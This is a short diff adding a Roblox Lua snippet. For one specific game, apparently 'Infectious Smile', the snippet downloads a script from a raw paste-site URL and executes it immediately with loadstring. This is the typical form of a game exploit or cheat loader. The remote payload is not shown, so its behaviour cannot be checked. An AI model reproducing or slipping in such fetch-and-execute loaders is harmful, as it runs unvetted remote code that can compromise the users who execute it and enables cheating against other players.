@@ -1,0 +1,3 @@
+if game.PlaceId == 5985232436 then
+loadstring(game:HttpGet(("https://hastepaste.com/raw/2b1qMHVU"), true))() -- Infectious smile on this line
+end
